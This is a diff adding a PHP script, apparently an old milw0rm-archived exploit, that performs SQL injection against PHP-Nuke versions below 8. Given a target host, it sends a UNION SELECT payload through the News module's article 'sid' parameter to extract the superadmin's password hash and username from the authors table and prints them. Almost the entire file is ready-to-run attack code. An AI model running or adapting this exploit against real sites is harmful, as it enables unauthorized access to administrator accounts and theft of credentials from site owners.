@@ -1,0 +1,63 @@
+<?php
+error_reporting (E_ERROR);
+ini_set("max_execution_time",0);
+
+echo '
++=========================================+
+| RST/GHC unpublished PHP Nuke exploit <8 |
++=========================================+
+<+> version <8.0
+<+> Tested on 7.9 & 6.0
+';
+
+if ($argc < 2){
+print "Usage: " . $argv[0] . " <host> <version> [table prefix]\n";
+print "ex.: " . $argv[0] . " phpnuke.org 7\n";
+credits();
+exit;
+}
+
+
+/* few definitions */
+if (empty($argv[3])){ $prefix = 'nuke';} #define tables prefix
+else {$prefix = $argv[3];}
+
+switch ($argv[2]){
+case "6":
+$query ="modules.php?name=News&file=article&sid=99999999+UNION+SELECT+null%20as%20catid,pwd%20as%20aid,null%20as%20time,pwd%20as%20title,null%20as%20hometext,aid%20as%20bodytext,null%20as%20topic,null%20as%20informant,null%20as%20notes,null%20as%20acomm,%20null%20as%20haspoll,null%20as%20pollID,null%20as%20score,null%20as%20ratings%20FROM%20%60".$prefix."_authors%60%20WHERE%20%60radminsuper%60%20='1'";
+$version = 6;
+break;
+default:
+$query ="modules.php?name=News&file=article&sid=99999999'+UNION+SELECT+null%20as%20catid,pwd%20as%20aid,null%20as%20time,pwd%20as%20title,null%20as%20hometext,aid%20as%20bodytext,null%20as%20topic,null%20as%20informant,null%20as%20notes,null%20as%20acomm,%20null%20as%20haspoll,null%20as%20pollID,null%20as%20score,null%20as%20ratings%20FROM%20%60".$prefix."_authors%60%20WHERE%20%60radminsuper%60%20='1";
+$version = 7;
+break;
+}
+
+$host = 'http://' . $argv[1] . '/'; # argv[1] - host
+$http = $host . $query;
+echo
+'[+] host: '.$host . '
+[+] nuke version: '.$version.'
+';
+#DEBUG
+//print $http . "\n";
+
+$result = file_get_contents($http);
+
+preg_match("/([a-f0-9]{32})/", $result, $matches);
+if ($matches[0]) {print "Admin's Hash: ".$matches[0];
+if (preg_match("/(?<=\<br\>\<br\>)(.*)(?=\"\<\/i\>)/", $result, $match)) print "\nAdmin's name: " .$match[0];}
+else {echo "Exploit failed...";}
+
+credits();
+
+
+function credits(){
+print "\n\n+========================================+\n\r Coded by Foster \n\r Copyright (c) RST/GHC";
+print "\n\r+========================================+\n";
+exit;
+}
+
+?>
+
+# milw0rm.com [2008-01-22]
